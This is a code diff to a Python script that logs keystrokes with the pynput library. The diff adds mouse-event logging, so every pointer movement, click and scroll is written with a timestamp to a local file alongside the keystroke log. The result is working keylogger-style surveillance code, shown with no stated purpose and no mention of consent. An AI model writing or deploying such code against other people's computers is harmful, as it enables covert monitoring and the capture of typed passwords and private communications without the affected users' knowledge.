@@ -4,6 +4,7 @@ from datetime import datetime
 
 # Define constants
 LOG_FILE = "log.txt"
+MOUSE_RECORD_FILE = "mouse_record.txt"
 MAX_KEYS = 10
 
 # Initialize key counter and list of keys
@@ -46,6 +47,33 @@ def write_file(keys):
         f.write("".join(words))
 
 
+def on_move(x, y):
+    with open(MOUSE_RECORD_FILE, "a") as f:
+        now = datetime.now()
+        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
+        f.write(f"{date_time}: Mouse moved to ({x}, {y})\n")
+
+
+def on_click(x, y, button, pressed):
+    with open(MOUSE_RECORD_FILE, "a") as f:
+        now = datetime.now()
+        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
+        if pressed:
+            f.write(
+                f"{date_time}: Mouse clicked at ({x}, {y}) with {button} button pressed\n")
+        else:
+            f.write(
+                f"{date_time}: Mouse released at ({x}, {y}) with {button} button released\n")
+
+
+def on_scroll(x, y, dx, dy):
+    with open(MOUSE_RECORD_FILE, "a") as f:
+        now = datetime.now()
+        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
+        f.write(
+            f"{date_time}: Mouse scrolled at ({x}, {y}) with ({dx}, {dy}) direction\n")
+
+
 def on_release(key):
     if key == pynput.keyboard.Key.esc:
         return False
@@ -53,4 +81,6 @@ def on_release(key):
 
 # Start listener
 with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    with pynput.mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mouse_listener:
+        listener.join()
+        mouse_listener.join()
